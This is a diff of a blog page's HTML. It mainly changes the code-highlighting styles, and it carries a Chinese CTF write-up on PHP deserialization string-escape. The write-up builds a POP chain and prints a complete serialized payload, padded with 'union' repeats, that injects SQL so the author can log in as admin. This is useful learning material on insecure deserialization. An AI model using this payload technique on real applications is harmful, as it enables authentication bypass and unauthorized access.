@@ -29,7 +29,15 @@
     
     
       
-      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/atom-one-dark-reasonable.min.css" />
+      
+        
+          
+          
+          
+        
+        <link  rel="stylesheet" href="https://cdn.staticfile.org/prism/1.22.0/themes/prism-funky.min.css" />
+      
+      
     
   
 
@@ -253,7 +261,7 @@
 <p>看来不是SQLi了      </p>
 <p>四个PHP文件    </p>
 <p><code>index.php</code>      </p>
-<div class="hljs"><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
 <span class="hljs-keyword">require_once</span> <span class="hljs-string">&quot;lib.php&quot;</span>;
 
 <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;action&#x27;</span>]))&#123;
@@ -267,9 +275,9 @@
 		<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;window.location.href=&#x27;./index.php?action=login&#x27;&lt;/script&gt;&quot;</span>;
 	&#125;
 &#125;
-<span class="hljs-meta">?&gt;</span></code></pre></div></code></pre>
+<span class="hljs-meta">?&gt;</span></code></pre></code></pre>
 <p><code>lib.php</code>        </p>
-<div class="hljs"><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
 error_reporting(<span class="hljs-number">0</span>);
 session_start();
 <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">safe</span>(<span class="hljs-params">$parm</span>)</span>
@@ -397,9 +405,9 @@ session_start();
 <span class="hljs-function">    </span>&#123;
         <span class="hljs-comment">//还没来得及写</span>
     &#125;
-&#125;</code></pre></div></code></pre>
+&#125;</code></pre></code></pre>
 <p><code>login.php</code>      </p>
-<div class="hljs"><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
 <span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;lib.php&#x27;</span>);
 <span class="hljs-meta">?&gt;</span>
 &lt;meta http-equiv=<span class="hljs-string">&quot;Content-Type&quot;</span> content=<span class="hljs-string">&quot;text/html; charset=utf-8&quot;</span> /&gt; 
@@ -430,9 +438,9 @@ $user=<span class="hljs-keyword">new</span> user();
 &#125;
 <span class="hljs-meta">?&gt;</span>
 	&lt;/form&gt;
-&lt;/center&gt;</code></pre></div></code></pre>
+&lt;/center&gt;</code></pre></code></pre>
 <p><code>update.php</code>       </p>
-<div class="hljs"><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
 <span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;lib.php&#x27;</span>);
 <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;html&gt;</span>
 <span class="hljs-string">&lt;meta charset=&quot;utf-8&quot;&gt;</span>
@@ -449,54 +457,54 @@ $users-&gt;update();
 	<span class="hljs-keyword">echo</span> $flag;
 &#125;
 
-<span class="hljs-meta">?&gt;</span></code></pre></div></code></pre>
+<span class="hljs-meta">?&gt;</span></code></pre></code></pre>
 <p>这个网站的逻辑就是要以admin登录，通过SQL语句查询，比较ID和passwd，正确的话，跳转到<code>update.php</code>，得到flag    </p>
 <p>主要是<code>lib.php</code>     </p>
-<div class="hljs"><pre><code>function safe($parm)
+<pre><code>function safe($parm)
 &#123;
     $array = array(&#39;union&#39;, &#39;regexp&#39;, &#39;load&#39;, &#39;into&#39;, &#39;flag&#39;, &#39;file&#39;, &#39;insert&#39;, &quot;&#39;&quot;, &#39;\\&#39;, &quot;*&quot;, &quot;alter&quot;);
     return str_replace($array, &#39;hacker&#39;, $parm);
-&#125;</code></pre></div>
+&#125;</code></pre>
 <p>看到这个，应该想到那个反序列化的字符逃逸了    </p>
-<div class="hljs"><pre><code>$this-&gt;id = $mysqli-&gt;login(&#39;select id,password from user where username=?&#39;);         </code></pre></div>
+<pre><code>$this-&gt;id = $mysqli-&gt;login(&#39;select id,password from user where username=?&#39;);         </code></pre>
 <hr>
-<div class="hljs"><pre><code>public function __call($name, $argument)
+<pre><code>public function __call($name, $argument)
     &#123;
         echo $this-&gt;CtrlCase-&gt;login($argument[0]);
-    &#125;</code></pre></div>
+    &#125;</code></pre>
 <p>两个login，而且第二个login的参数是可控的     </p>
 <p>所以     </p>
 <p>以此，构造pop链反序列化修改SQL语句     </p>
 <p>入口—&gt;update.php里的       </p>
-<div class="hljs"><pre><code>$users=new User();
-$users-&gt;update();        </code></pre></div>
+<pre><code>$users=new User();
+$users-&gt;update();        </code></pre>
 <p>跟进<code>lib.php</code>里的update()      </p>
 <p>首先<code>  $Info = unserialize($this-&gt;getNewinfo());</code>应该是出口了      </p>
 <p>这个<code>$updateAction = new UpdateHelper($_SESSION[&#39;id&#39;],$Info, &quot;update user SET age=$age,nickname=$nickname where id=&quot; . $_SESSION[&#39;id&#39;]);</code>    </p>
 <p>跟进<code>UpdateHelper</code>    </p>
 <p><code>$sql</code>没有使用，且<code>echo $this-&gt;sql;</code>        </p>
 <p>让<code>sql=new User()</code>来触发toString     </p>
-<div class="hljs"><pre><code>public function __toString()
+<pre><code>public function __toString()
     &#123;
         $this-&gt;nickname-&gt;update($this-&gt;age);
         return &quot;0-0&quot;;
-    &#125; </code></pre></div>
+    &#125; </code></pre>
 <p>让<code>nickname=new Info()</code>来触发<code>__call</code></p>
-<div class="hljs"><pre><code>public function __call($name, $argument)
+<pre><code>public function __call($name, $argument)
 &#123;
     echo $this-&gt;CtrlCase-&gt;login($argument[0]);
-&#125;      </code></pre></div>
+&#125;      </code></pre>
 <p>接着让<code>CtrlCase=new dbCtrl()</code>就可以执行自定的SQL了    </p>
 <p>将password修改     </p>
-<div class="hljs"><pre><code>select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?</code></pre></div>
+<pre><code>select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?</code></pre>
 <p>c4ca4238a0b923820dcc509a6f75849b是1的MD5值      </p>
 <p><img src="https://img12.360buyimg.com/ddimg/jfs/t1/192784/20/706/130842/608c3197Ec5588c09/d8bef464f63eb40a.png" srcset="/img/loading.gif" alt="03.png"></p>
 <p>这样再控制dbCtrl里的name和password就可以以admin登录       </p>
 <p>之后     </p>
-<div class="hljs"><pre><code>$_SESSION[&#39;token&#39;] = $this-&gt;name;
-        return $idResult;      </code></pre></div>
+<pre><code>$_SESSION[&#39;token&#39;] = $this-&gt;name;
+        return $idResult;      </code></pre>
 <p>重新登陆时不管密码是什么都能登陆成功，得到flag了     </p>
-<div class="hljs"><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
 <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UpdateHelper</span></span>
 <span class="hljs-class"></span>&#123;
     <span class="hljs-keyword">public</span> $sql;
@@ -534,16 +542,16 @@ $users-&gt;update();        </code></pre></div>
 &#125;
 
 $a=<span class="hljs-keyword">new</span> UpdateHelper();
-<span class="hljs-keyword">echo</span> serialize($a);</code></pre></div></code></pre>
+<span class="hljs-keyword">echo</span> serialize($a);</code></pre></code></pre>
 <p>结果为</p>
-<div class="hljs"><pre><code>O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; 
-from user where username=?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;&#125;&#125;&#125;&#125;      </code></pre></div>
+<pre><code>O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; 
+from user where username=?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;&#125;&#125;&#125;&#125;      </code></pre>
 <p>回到出口处     </p>
 <p><code>getNewInfo()</code>中     </p>
-<div class="hljs"><pre><code>return safe(serialize(new Info($age, $nickname)));     </code></pre></div>
+<pre><code>return safe(serialize(new Info($age, $nickname)));     </code></pre>
 <p>这里序列化的是一个新类，这样的话，刚才得到的payload只会被视为一个长的字符串，并不会被反序列化       </p>
 <p>所以要字符逃逸       </p>
-<div class="hljs"><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
 <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Info</span></span>
 <span class="hljs-class"></span>&#123;
     <span class="hljs-keyword">public</span> $age=<span class="hljs-number">1</span>;
@@ -551,7 +559,7 @@ from user where username=?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1
     <span class="hljs-keyword">public</span> $CtrlCase=<span class="hljs-number">123</span>;
 &#125;
 $a=<span class="hljs-keyword">new</span> Info();
-<span class="hljs-keyword">echo</span> serialize($a);</code></pre></div></code></pre>
+<span class="hljs-keyword">echo</span> serialize($a);</code></pre></code></pre>
 <p>输出：<code>O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;i:1;s:8:&quot;nickname&quot;;s:3:&quot;123&quot;;s:8:&quot;CtrlCase&quot;;i:123;&#125;</code>       </p>
 <p>要想逃逸，需要再刚才的payload前加上<code>&quot;;s:8:&quot;CtrlCase&quot;;</code>（<code>&quot;</code>来闭合序列化后生成的<code>&quot;</code>）后面加上<code>&#125;</code>来提前结束反序列化     </p>
 <p>payload:<code>&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;&#125;&#125;&#125;&#125;&#125;</code>      </p>
@@ -560,7 +568,7 @@ $a=<span class="hljs-keyword">new</span> Info();
 <p>在双引号中加入263个union，或者其他（那个safe函数中的，只要凑够263即可）      </p>
 <p>经过safe函数后，就多出263个，就将原来的263个逃逸出来了       </p>
 <p>最终payload：</p>
-<div class="hljs"><pre><code>   age=1&amp;nickname=unionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunion&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;&#125;&#125;&#125;&#125;&#125;        </code></pre></div>
+<pre><code>   age=1&amp;nickname=unionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunion&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;&#125;&#125;&#125;&#125;&#125;        </code></pre>
 <p>在<code>update.php</code>页面POST提交，重新登录（admin，密码随意）得到flag</p>
 
             </div>
@@ -721,6 +729,8 @@ $a=<span class="hljs-keyword">new</span> Info();
 
 
 
+  
+    
   
 
 
